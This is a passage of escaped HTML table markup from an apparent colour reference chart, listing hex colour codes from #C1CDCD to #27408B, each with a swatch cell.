 &lt;td bgcolor="#c1cdcd" height="30" width="30">&lt;/td>
 &lt;td>#C1CDCD&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#c1cdc1" height="30" width="30">&lt;/td>
 &lt;td>#C1CDC1&lt;/td>
 &lt;td bgcolor="#c1c1c1" height="30" width="30">&lt;/td>
 &lt;td>#C1C1C1&lt;/td>
 &lt;td bgcolor="#c0ff3e" height="30" width="30">&lt;/td>
 &lt;td>#C0FF3E&lt;/td>
 &lt;td bgcolor="#bfefff" height="30" width="30">&lt;/td>
 &lt;td>#BFEFFF&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#bfbfbf" height="30" width="30">&lt;/td>
 &lt;td>#BFBFBF&lt;/td>
 &lt;td bgcolor="#bf3eff" height="30" width="30">&lt;/td>
 &lt;td>#BF3EFF&lt;/td>
 &lt;td bgcolor="#bebebe" height="30" width="30">&lt;/td>
 &lt;td>#BEBEBE&lt;/td>
 &lt;td bgcolor="#bdbdbd" height="30" width="30">&lt;/td>
 &lt;td>#BDBDBD&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#bdb76b" height="30" width="30">&lt;/td>
 &lt;td>#BDB76B&lt;/td>
 &lt;td bgcolor="#bcee68" height="30" width="30">&lt;/td>
 &lt;td>#BCEE68&lt;/td>
 &lt;td bgcolor="#bcd2ee" height="30" width="30">&lt;/td>
 &lt;td>#BCD2EE&lt;/td>
 &lt;td bgcolor="#bc8f8f" height="30" width="30">&lt;/td>
 &lt;td>#BC8F8F&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#bbffff" height="30" width="30">&lt;/td>
 &lt;td>#BBFFFF&lt;/td>
 &lt;td bgcolor="#bababa" height="30" width="30">&lt;/td>
 &lt;td>#BABABA&lt;/td>
 &lt;td bgcolor="#ba55d3" height="30" width="30">&lt;/td>
 &lt;td>#BA55D3&lt;/td>
 &lt;td bgcolor="#b9d3ee" height="30" width="30">&lt;/td>
 &lt;td>#B9D3EE&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#b8b8b8" height="30" width="30">&lt;/td>
 &lt;td>#B8B8B8&lt;/td>
 &lt;td bgcolor="#b8860b" height="30" width="30">&lt;/td>
 &lt;td>#B8860B&lt;/td>
 &lt;td bgcolor="#b7b7b7" height="30" width="30">&lt;/td>
 &lt;td>#B7B7B7&lt;/td>
 &lt;td bgcolor="#b5b5b5" height="30" width="30">&lt;/td>
 &lt;td>#B5B5B5&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#b4eeb4" height="30" width="30">&lt;/td>
 &lt;td>#B4EEB4&lt;/td>
 &lt;td bgcolor="#b4cdcd" height="30" width="30">&lt;/td>
 &lt;td>#B4CDCD&lt;/td>
 &lt;td bgcolor="#b452cd" height="30" width="30">&lt;/td>
 &lt;td>#B452CD&lt;/td>
 &lt;td bgcolor="#b3ee3a" height="30" width="30">&lt;/td>
 &lt;td>#B3EE3A&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#b3b3b3" height="30" width="30">&lt;/td>
 &lt;td>#B3B3B3&lt;/td>
 &lt;td bgcolor="#b2dfee" height="30" width="30">&lt;/td>
 &lt;td>#B2DFEE&lt;/td>
 &lt;td bgcolor="#b23aee" height="30" width="30">&lt;/td>
 &lt;td>#B23AEE&lt;/td>
 &lt;td bgcolor="#b22222" height="30" width="30">&lt;/td>
 &lt;td>#B22222&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#b0e2ff" height="30" width="30">&lt;/td>
 &lt;td>#B0E2FF&lt;/td>
 &lt;td bgcolor="#b0e0e6" height="30" width="30">&lt;/td>
 &lt;td>#B0E0E6&lt;/td>
 &lt;td bgcolor="#b0c4de" height="30" width="30">&lt;/td>
 &lt;td>#B0C4DE&lt;/td>
 &lt;td bgcolor="#b0b0b0" height="30" width="30">&lt;/td>
 &lt;td>#B0B0B0&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#b03060" height="30" width="30">&lt;/td>
 &lt;td>#B03060&lt;/td>
 &lt;td bgcolor="#aeeeee" height="30" width="30">&lt;/td>
 &lt;td>#AEEEEE&lt;/td>
 &lt;td bgcolor="#adff2f" height="30" width="30">&lt;/td>
 &lt;td>#ADFF2F&lt;/td>
 &lt;td bgcolor="#add8e6" height="30" width="30">&lt;/td>
 &lt;td>#ADD8E6&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#adadad" height="30" width="30">&lt;/td>
 &lt;td>#ADADAD&lt;/td>
 &lt;td bgcolor="#ababab" height="30" width="30">&lt;/td>
 &lt;td>#ABABAB&lt;/td>
 &lt;td bgcolor="#ab82ff" height="30" width="30">&lt;/td>
 &lt;td>#AB82FF&lt;/td>
 &lt;td bgcolor="#aaaaaa" height="30" width="30">&lt;/td>
 &lt;td>#AAAAAA&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#a9a9a9" height="30" width="30">&lt;/td>
 &lt;td>#A9A9A9&lt;/td>
 &lt;td bgcolor="#a8a8a8" height="30" width="30">&lt;/td>
 &lt;td>#A8A8A8&lt;/td>
 &lt;td bgcolor="#a6a6a6" height="30" width="30">&lt;/td>
 &lt;td>#A6A6A6&lt;/td>
 &lt;td bgcolor="#a52a2a" height="30" width="30">&lt;/td>
 &lt;td>#A52A2A&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#a4d3ee" height="30" width="30">&lt;/td>
 &lt;td>#A4D3EE&lt;/td>
 &lt;td bgcolor="#a3a3a3" height="30" width="30">&lt;/td>
 &lt;td>#A3A3A3&lt;/td>
 &lt;td bgcolor="#a2cd5a" height="30" width="30">&lt;/td>
 &lt;td>#A2CD5A&lt;/td>
 &lt;td bgcolor="#a2b5cd" height="30" width="30">&lt;/td>
 &lt;td>#A2B5CD&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#a1a1a1" height="30" width="30">&lt;/td>
 &lt;td>#A1A1A1&lt;/td>
 &lt;td bgcolor="#a0522d" height="30" width="30">&lt;/td>
 &lt;td>#A0522D&lt;/td>
 &lt;td bgcolor="#a020f0" height="30" width="30">&lt;/td>
 &lt;td>#A020F0&lt;/td>
 &lt;td bgcolor="#9fb6cd" height="30" width="30">&lt;/td>
 &lt;td>#9FB6CD&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#9f79ee" height="30" width="30">&lt;/td>
 &lt;td>#9F79EE&lt;/td>
 &lt;td bgcolor="#9e9e9e" height="30" width="30">&lt;/td>
 &lt;td>#9E9E9E&lt;/td>
 &lt;td bgcolor="#9c9c9c" height="30" width="30">&lt;/td>
 &lt;td>#9C9C9C&lt;/td>
 &lt;td bgcolor="#9bcd9b" height="30" width="30">&lt;/td>
 &lt;td>#9BCD9B&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#9b30ff" height="30" width="30">&lt;/td>
 &lt;td>#9B30FF&lt;/td>
 &lt;td bgcolor="#9aff9a" height="30" width="30">&lt;/td>
 &lt;td>#9AFF9A&lt;/td>
 &lt;td bgcolor="#9acd32" height="30" width="30">&lt;/td>
 &lt;td>#9ACD32&lt;/td>
 &lt;td bgcolor="#9ac0cd" height="30" width="30">&lt;/td>
 &lt;td>#9AC0CD&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#9a32cd" height="30" width="30">&lt;/td>
 &lt;td>#9A32CD&lt;/td>
 &lt;td bgcolor="#999999" height="30" width="30">&lt;/td>
 &lt;td>#999999&lt;/td>
 &lt;td bgcolor="#9932cc" height="30" width="30">&lt;/td>
 &lt;td>#9932CC&lt;/td>
 &lt;td bgcolor="#98fb98" height="30" width="30">&lt;/td>
 &lt;td>#98FB98&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#98f5ff" height="30" width="30">&lt;/td>
 &lt;td>#98F5FF&lt;/td>
 &lt;td bgcolor="#97ffff" height="30" width="30">&lt;/td>
 &lt;td>#97FFFF&lt;/td>
 &lt;td bgcolor="#96cdcd" height="30" width="30">&lt;/td>
 &lt;td>#96CDCD&lt;/td>
 &lt;td bgcolor="#969696" height="30" width="30">&lt;/td>
 &lt;td>#969696&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#949494" height="30" width="30">&lt;/td>
 &lt;td>#949494&lt;/td>
 &lt;td bgcolor="#9400d3" height="30" width="30">&lt;/td>
 &lt;td>#9400D3&lt;/td>
 &lt;td bgcolor="#9370db" height="30" width="30">&lt;/td>
 &lt;td>#9370DB&lt;/td>
 &lt;td bgcolor="#919191" height="30" width="30">&lt;/td>
 &lt;td>#919191&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#912cee" height="30" width="30">&lt;/td>
 &lt;td>#912CEE&lt;/td>
 &lt;td bgcolor="#90ee90" height="30" width="30">&lt;/td>
 &lt;td>#90EE90&lt;/td>
 &lt;td bgcolor="#8fbc8f" height="30" width="30">&lt;/td>
 &lt;td>#8FBC8F&lt;/td>
 &lt;td bgcolor="#8f8f8f" height="30" width="30">&lt;/td>
 &lt;td>#8F8F8F&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#8ee5ee" height="30" width="30">&lt;/td>
 &lt;td>#8EE5EE&lt;/td>
 &lt;td bgcolor="#8e8e8e" height="30" width="30">&lt;/td>
 &lt;td>#8E8E8E&lt;/td>
 &lt;td bgcolor="#8e8e38" height="30" width="30">&lt;/td>
 &lt;td>#8E8E38&lt;/td>
 &lt;td bgcolor="#8e388e" height="30" width="30">&lt;/td>
 &lt;td>#8E388E&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#8deeee" height="30" width="30">&lt;/td>
 &lt;td>#8DEEEE&lt;/td>
 &lt;td bgcolor="#8db6cd" height="30" width="30">&lt;/td>
 &lt;td>#8DB6CD&lt;/td>
 &lt;td bgcolor="#8c8c8c" height="30" width="30">&lt;/td>
 &lt;td>#8C8C8C&lt;/td>
 &lt;td bgcolor="#8b8b83" height="30" width="30">&lt;/td>
 &lt;td>#8B8B83&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#8b8b7a" height="30" width="30">&lt;/td>
 &lt;td>#8B8B7A&lt;/td>
 &lt;td bgcolor="#8b8b00" height="30" width="30">&lt;/td>
 &lt;td>#8B8B00&lt;/td>
 &lt;td bgcolor="#8b8989" height="30" width="30">&lt;/td>
 &lt;td>#8B8989&lt;/td>
 &lt;td bgcolor="#8b8970" height="30" width="30">&lt;/td>
 &lt;td>#8B8970&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#8b8878" height="30" width="30">&lt;/td>
 &lt;td>#8B8878&lt;/td>
 &lt;td bgcolor="#8b8682" height="30" width="30">&lt;/td>
 &lt;td>#8B8682&lt;/td>
 &lt;td bgcolor="#8b864e" height="30" width="30">&lt;/td>
 &lt;td>#8B864E&lt;/td>
 &lt;td bgcolor="#8b8386" height="30" width="30">&lt;/td>
 &lt;td>#8B8386&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#8b8378" height="30" width="30">&lt;/td>
 &lt;td>#8B8378&lt;/td>
 &lt;td bgcolor="#8b814c" height="30" width="30">&lt;/td>
 &lt;td>#8B814C&lt;/td>
 &lt;td bgcolor="#8b7e66" height="30" width="30">&lt;/td>
 &lt;td>#8B7E66&lt;/td>
 &lt;td bgcolor="#8b7d7b" height="30" width="30">&lt;/td>
 &lt;td>#8B7D7B&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#8b7d6b" height="30" width="30">&lt;/td>
 &lt;td>#8B7D6B&lt;/td>
 &lt;td bgcolor="#8b7b8b" height="30" width="30">&lt;/td>
 &lt;td>#8B7B8B&lt;/td>
 &lt;td bgcolor="#8b795e" height="30" width="30">&lt;/td>
 &lt;td>#8B795E&lt;/td>
 &lt;td bgcolor="#8b7765" height="30" width="30">&lt;/td>
 &lt;td>#8B7765&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#8b7500" height="30" width="30">&lt;/td>
 &lt;td>#8B7500&lt;/td>
 &lt;td bgcolor="#8b7355" height="30" width="30">&lt;/td>
 &lt;td>#8B7355&lt;/td>
 &lt;td bgcolor="#8b6969" height="30" width="30">&lt;/td>
 &lt;td>#8B6969&lt;/td>
 &lt;td bgcolor="#8b6914" height="30" width="30">&lt;/td>
 &lt;td>#8B6914&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#8b668b" height="30" width="30">&lt;/td>
 &lt;td>#8B668B&lt;/td>
 &lt;td bgcolor="#8b6508" height="30" width="30">&lt;/td>
 &lt;td>#8B6508&lt;/td>
 &lt;td bgcolor="#8b636c" height="30" width="30">&lt;/td>
 &lt;td>#8B636C&lt;/td>
 &lt;td bgcolor="#8b5f65" height="30" width="30">&lt;/td>
 &lt;td>#8B5F65&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#8b5a2b" height="30" width="30">&lt;/td>
 &lt;td>#8B5A2B&lt;/td>
 &lt;td bgcolor="#8b5a00" height="30" width="30">&lt;/td>
 &lt;td>#8B5A00&lt;/td>
 &lt;td bgcolor="#8b5742" height="30" width="30">&lt;/td>
 &lt;td>#8B5742&lt;/td>
 &lt;td bgcolor="#8b4c39" height="30" width="30">&lt;/td>
 &lt;td>#8B4C39&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#8b4789" height="30" width="30">&lt;/td>
 &lt;td>#8B4789&lt;/td>
 &lt;td bgcolor="#8b475d" height="30" width="30">&lt;/td>
 &lt;td>#8B475D&lt;/td>
 &lt;td bgcolor="#8b4726" height="30" width="30">&lt;/td>
 &lt;td>#8B4726&lt;/td>
 &lt;td bgcolor="#8b4513" height="30" width="30">&lt;/td>
 &lt;td>#8B4513&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#8b4500" height="30" width="30">&lt;/td>
 &lt;td>#8B4500&lt;/td>
 &lt;td bgcolor="#8b3e2f" height="30" width="30">&lt;/td>
 &lt;td>#8B3E2F&lt;/td>
 &lt;td bgcolor="#8b3a62" height="30" width="30">&lt;/td>
 &lt;td>#8B3A62&lt;/td>
 &lt;td bgcolor="#8b3a3a" height="30" width="30">&lt;/td>
 &lt;td>#8B3A3A&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#8b3626" height="30" width="30">&lt;/td>
 &lt;td>#8B3626&lt;/td>
 &lt;td bgcolor="#8b2500" height="30" width="30">&lt;/td>
 &lt;td>#8B2500&lt;/td>
 &lt;td bgcolor="#8b2323" height="30" width="30">&lt;/td>
 &lt;td>#8B2323&lt;/td>
 &lt;td bgcolor="#8b2252" height="30" width="30">&lt;/td>
 &lt;td>#8B2252&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#8b1c62" height="30" width="30">&lt;/td>
 &lt;td>#8B1C62&lt;/td>
 &lt;td bgcolor="#8b1a1a" height="30" width="30">&lt;/td>
 &lt;td>#8B1A1A&lt;/td>
 &lt;td bgcolor="#8b0a50" height="30" width="30">&lt;/td>
 &lt;td>#8B0A50&lt;/td>
 &lt;td bgcolor="#8b008b" height="30" width="30">&lt;/td>
 &lt;td>#8B008B&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#8b0000" height="30" width="30">&lt;/td>
 &lt;td>#8B0000&lt;/td>
 &lt;td bgcolor="#8a8a8a" height="30" width="30">&lt;/td>
 &lt;td>#8A8A8A&lt;/td>
 &lt;td bgcolor="#8a2be2" height="30" width="30">&lt;/td>
 &lt;td>#8A2BE2&lt;/td>
 &lt;td bgcolor="#8968cd" height="30" width="30">&lt;/td>
 &lt;td>#8968CD&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#87ceff" height="30" width="30">&lt;/td>
 &lt;td>#87CEFF&lt;/td>
 &lt;td bgcolor="#87cefa" height="30" width="30">&lt;/td>
 &lt;td>#87CEFA&lt;/td>
 &lt;td bgcolor="#87ceeb" height="30" width="30">&lt;/td>
 &lt;td>#87CEEB&lt;/td>
 &lt;td bgcolor="#878787" height="30" width="30">&lt;/td>
 &lt;td>#878787&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#858585" height="30" width="30">&lt;/td>
 &lt;td>#858585&lt;/td>
 &lt;td bgcolor="#848484" height="30" width="30">&lt;/td>
 &lt;td>#848484&lt;/td>
 &lt;td bgcolor="#8470ff" height="30" width="30">&lt;/td>
 &lt;td>#8470FF&lt;/td>
 &lt;td bgcolor="#838b8b" height="30" width="30">&lt;/td>
 &lt;td>#838B8B&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#838b83" height="30" width="30">&lt;/td>
 &lt;td>#838B83&lt;/td>
 &lt;td bgcolor="#836fff" height="30" width="30">&lt;/td>
 &lt;td>#836FFF&lt;/td>
 &lt;td bgcolor="#828282" height="30" width="30">&lt;/td>
 &lt;td>#828282&lt;/td>
 &lt;td bgcolor="#7fffd4" height="30" width="30">&lt;/td>
 &lt;td>#7FFFD4&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#7fff00" height="30" width="30">&lt;/td>
 &lt;td>#7FFF00&lt;/td>
 &lt;td bgcolor="#7f7f7f" height="30" width="30">&lt;/td>
 &lt;td>#7F7F7F&lt;/td>
 &lt;td bgcolor="#7ec0ee" height="30" width="30">&lt;/td>
 &lt;td>#7EC0EE&lt;/td>
 &lt;td bgcolor="#7d9ec0" height="30" width="30">&lt;/td>
 &lt;td>#7D9EC0&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#7d7d7d" height="30" width="30">&lt;/td>
 &lt;td>#7D7D7D&lt;/td>
 &lt;td bgcolor="#7d26cd" height="30" width="30">&lt;/td>
 &lt;td>#7D26CD&lt;/td>
 &lt;td bgcolor="#7cfc00" height="30" width="30">&lt;/td>
 &lt;td>#7CFC00&lt;/td>
 &lt;td bgcolor="#7ccd7c" height="30" width="30">&lt;/td>
 &lt;td>#7CCD7C&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#7b68ee" height="30" width="30">&lt;/td>
 &lt;td>#7B68EE&lt;/td>
 &lt;td bgcolor="#7ac5cd" height="30" width="30">&lt;/td>
 &lt;td>#7AC5CD&lt;/td>
 &lt;td bgcolor="#7a8b8b" height="30" width="30">&lt;/td>
 &lt;td>#7A8B8B&lt;/td>
 &lt;td bgcolor="#7a7a7a" height="30" width="30">&lt;/td>
 &lt;td>#7A7A7A&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#7a67ee" height="30" width="30">&lt;/td>
 &lt;td>#7A67EE&lt;/td>
 &lt;td bgcolor="#7a378b" height="30" width="30">&lt;/td>
 &lt;td>#7A378B&lt;/td>
 &lt;td bgcolor="#79cdcd" height="30" width="30">&lt;/td>
 &lt;td>#79CDCD&lt;/td>
 &lt;td bgcolor="#787878" height="30" width="30">&lt;/td>
 &lt;td>#787878&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#778899" height="30" width="30">&lt;/td>
 &lt;td>#778899&lt;/td>
 &lt;td bgcolor="#76eec6" height="30" width="30">&lt;/td>
 &lt;td>#76EEC6&lt;/td>
 &lt;td bgcolor="#76ee00" height="30" width="30">&lt;/td>
 &lt;td>#76EE00&lt;/td>
 &lt;td bgcolor="#757575" height="30" width="30">&lt;/td>
 &lt;td>#757575&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#737373" height="30" width="30">&lt;/td>
 &lt;td>#737373&lt;/td>
 &lt;td bgcolor="#71c671" height="30" width="30">&lt;/td>
 &lt;td>#71C671&lt;/td>
 &lt;td bgcolor="#7171c6" height="30" width="30">&lt;/td>
 &lt;td>#7171C6&lt;/td>
 &lt;td bgcolor="#708090" height="30" width="30">&lt;/td>
 &lt;td>#708090&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#707070" height="30" width="30">&lt;/td>
 &lt;td>#707070&lt;/td>
 &lt;td bgcolor="#6e8b3d" height="30" width="30">&lt;/td>
 &lt;td>#6E8B3D&lt;/td>
 &lt;td bgcolor="#6e7b8b" height="30" width="30">&lt;/td>
 &lt;td>#6E7B8B&lt;/td>
 &lt;td bgcolor="#6e6e6e" height="30" width="30">&lt;/td>
 &lt;td>#6E6E6E&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#6ca6cd" height="30" width="30">&lt;/td>
 &lt;td>#6CA6CD&lt;/td>
 &lt;td bgcolor="#6c7b8b" height="30" width="30">&lt;/td>
 &lt;td>#6C7B8B&lt;/td>
 &lt;td bgcolor="#6b8e23" height="30" width="30">&lt;/td>
 &lt;td>#6B8E23&lt;/td>
 &lt;td bgcolor="#6b6b6b" height="30" width="30">&lt;/td>
 &lt;td>#6B6B6B&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#6a5acd" height="30" width="30">&lt;/td>
 &lt;td>#6A5ACD&lt;/td>
 &lt;td bgcolor="#698b69" height="30" width="30">&lt;/td>
 &lt;td>#698B69&lt;/td>
 &lt;td bgcolor="#698b22" height="30" width="30">&lt;/td>
 &lt;td>#698B22&lt;/td>
 &lt;td bgcolor="#696969" height="30" width="30">&lt;/td>
 &lt;td>#696969&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#6959cd" height="30" width="30">&lt;/td>
 &lt;td>#6959CD&lt;/td>
 &lt;td bgcolor="#68838b" height="30" width="30">&lt;/td>
 &lt;td>#68838B&lt;/td>
 &lt;td bgcolor="#68228b" height="30" width="30">&lt;/td>
 &lt;td>#68228B&lt;/td>
 &lt;td bgcolor="#66cdaa" height="30" width="30">&lt;/td>
 &lt;td>#66CDAA&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#66cd00" height="30" width="30">&lt;/td>
 &lt;td>#66CD00&lt;/td>
 &lt;td bgcolor="#668b8b" height="30" width="30">&lt;/td>
 &lt;td>#668B8B&lt;/td>
 &lt;td bgcolor="#666666" height="30" width="30">&lt;/td>
 &lt;td>#666666&lt;/td>
 &lt;td bgcolor="#6495ed" height="30" width="30">&lt;/td>
 &lt;td>#6495ED&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#63b8ff" height="30" width="30">&lt;/td>
 &lt;td>#63B8FF&lt;/td>
 &lt;td bgcolor="#636363" height="30" width="30">&lt;/td>
 &lt;td>#636363&lt;/td>
 &lt;td bgcolor="#616161" height="30" width="30">&lt;/td>
 &lt;td>#616161&lt;/td>
 &lt;td bgcolor="#607b8b" height="30" width="30">&lt;/td>
 &lt;td>#607B8B&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#5f9ea0" height="30" width="30">&lt;/td>
 &lt;td>#5F9EA0&lt;/td>
 &lt;td bgcolor="#5e5e5e" height="30" width="30">&lt;/td>
 &lt;td>#5E5E5E&lt;/td>
 &lt;td bgcolor="#5d478b" height="30" width="30">&lt;/td>
 &lt;td>#5D478B&lt;/td>
 &lt;td bgcolor="#5cacee" height="30" width="30">&lt;/td>
 &lt;td>#5CACEE&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#5c5c5c" height="30" width="30">&lt;/td>
 &lt;td>#5C5C5C&lt;/td>
 &lt;td bgcolor="#5b5b5b" height="30" width="30">&lt;/td>
 &lt;td>#5B5B5B&lt;/td>
 &lt;td bgcolor="#595959" height="30" width="30">&lt;/td>
 &lt;td>#595959&lt;/td>
 &lt;td bgcolor="#575757" height="30" width="30">&lt;/td>
 &lt;td>#575757&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#556b2f" height="30" width="30">&lt;/td>
 &lt;td>#556B2F&lt;/td>
 &lt;td bgcolor="#555555" height="30" width="30">&lt;/td>
 &lt;td>#555555&lt;/td>
 &lt;td bgcolor="#551a8b" height="30" width="30">&lt;/td>
 &lt;td>#551A8B&lt;/td>
 &lt;td bgcolor="#54ff9f" height="30" width="30">&lt;/td>
 &lt;td>#54FF9F&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#548b54" height="30" width="30">&lt;/td>
 &lt;td>#548B54&lt;/td>
 &lt;td bgcolor="#545454" height="30" width="30">&lt;/td>
 &lt;td>#545454&lt;/td>
 &lt;td bgcolor="#53868b" height="30" width="30">&lt;/td>
 &lt;td>#53868B&lt;/td>
 &lt;td bgcolor="#528b8b" height="30" width="30">&lt;/td>
 &lt;td>#528B8B&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#525252" height="30" width="30">&lt;/td>
 &lt;td>#525252&lt;/td>
 &lt;td bgcolor="#515151" height="30" width="30">&lt;/td>
 &lt;td>#515151&lt;/td>
 &lt;td bgcolor="#4f94cd" height="30" width="30">&lt;/td>
 &lt;td>#4F94CD&lt;/td>
 &lt;td bgcolor="#4f4f4f" height="30" width="30">&lt;/td>
 &lt;td>#4F4F4F&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#4eee94" height="30" width="30">&lt;/td>
 &lt;td>#4EEE94&lt;/td>
 &lt;td bgcolor="#4d4d4d" height="30" width="30">&lt;/td>
 &lt;td>#4D4D4D&lt;/td>
 &lt;td bgcolor="#4b0082" height="30" width="30">&lt;/td>
 &lt;td>#4B0082&lt;/td>
 &lt;td bgcolor="#4a708b" height="30" width="30">&lt;/td>
 &lt;td>#4A708B&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#4a4a4a" height="30" width="30">&lt;/td>
 &lt;td>#4A4A4A&lt;/td>
 &lt;td bgcolor="#48d1cc" height="30" width="30">&lt;/td>
 &lt;td>#48D1CC&lt;/td>
 &lt;td bgcolor="#4876ff" height="30" width="30">&lt;/td>
 &lt;td>#4876FF&lt;/td>
 &lt;td bgcolor="#483d8b" height="30" width="30">&lt;/td>
 &lt;td>#483D8B&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#474747" height="30" width="30">&lt;/td>
 &lt;td>#474747&lt;/td>
 &lt;td bgcolor="#473c8b" height="30" width="30">&lt;/td>
 &lt;td>#473C8B&lt;/td>
 &lt;td bgcolor="#4682b4" height="30" width="30">&lt;/td>
 &lt;td>#4682B4&lt;/td>
 &lt;td bgcolor="#458b74" height="30" width="30">&lt;/td>
 &lt;td>#458B74&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#458b00" height="30" width="30">&lt;/td>
 &lt;td>#458B00&lt;/td>
 &lt;td bgcolor="#454545" height="30" width="30">&lt;/td>
 &lt;td>#454545&lt;/td>
 &lt;td bgcolor="#43cd80" height="30" width="30">&lt;/td>
 &lt;td>#43CD80&lt;/td>
 &lt;td bgcolor="#436eee" height="30" width="30">&lt;/td>
 &lt;td>#436EEE&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#424242" height="30" width="30">&lt;/td>
 &lt;td>#424242&lt;/td>
 &lt;td bgcolor="#4169e1" height="30" width="30">&lt;/td>
 &lt;td>#4169E1&lt;/td>
 &lt;td bgcolor="#40e0d0" height="30" width="30">&lt;/td>
 &lt;td>#40E0D0&lt;/td>
 &lt;td bgcolor="#404040" height="30" width="30">&lt;/td>
 &lt;td>#404040&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#3d3d3d" height="30" width="30">&lt;/td>
 &lt;td>#3D3D3D&lt;/td>
 &lt;td bgcolor="#3cb371" height="30" width="30">&lt;/td>
 &lt;td>#3CB371&lt;/td>
 &lt;td bgcolor="#3b3b3b" height="30" width="30">&lt;/td>
 &lt;td>#3B3B3B&lt;/td>
 &lt;td bgcolor="#3a5fcd" height="30" width="30">&lt;/td>
 &lt;td>#3A5FCD&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#388e8e" height="30" width="30">&lt;/td>
 &lt;td>#388E8E&lt;/td>
 &lt;td bgcolor="#383838" height="30" width="30">&lt;/td>
 &lt;td>#383838&lt;/td>
 &lt;td bgcolor="#36648b" height="30" width="30">&lt;/td>
 &lt;td>#36648B&lt;/td>
 &lt;td bgcolor="#363636" height="30" width="30">&lt;/td>
 &lt;td>#363636&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#333333" height="30" width="30">&lt;/td>
 &lt;td>#333333&lt;/td>
 &lt;td bgcolor="#32cd32" height="30" width="30">&lt;/td>
 &lt;td>#32CD32&lt;/td>
 &lt;td bgcolor="#303030" height="30" width="30">&lt;/td>
 &lt;td>#303030&lt;/td>
 &lt;td bgcolor="#2f4f4f" height="30" width="30">&lt;/td>
 &lt;td>#2F4F4F&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#2e8b57" height="30" width="30">&lt;/td>
 &lt;td>#2E8B57&lt;/td>
 &lt;td bgcolor="#2e2e2e" height="30" width="30">&lt;/td>
 &lt;td>#2E2E2E&lt;/td>
 &lt;td bgcolor="#2b2b2b" height="30" width="30">&lt;/td>
 &lt;td>#2B2B2B&lt;/td>
 &lt;td bgcolor="#292929" height="30" width="30">&lt;/td>
 &lt;td>#292929&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#282828" height="30" width="30">&lt;/td>
 &lt;td>#282828&lt;/td>
 &lt;td bgcolor="#27408b" height="30" width="30">&lt;/td>
 &lt;td>#27408B&lt;/td>
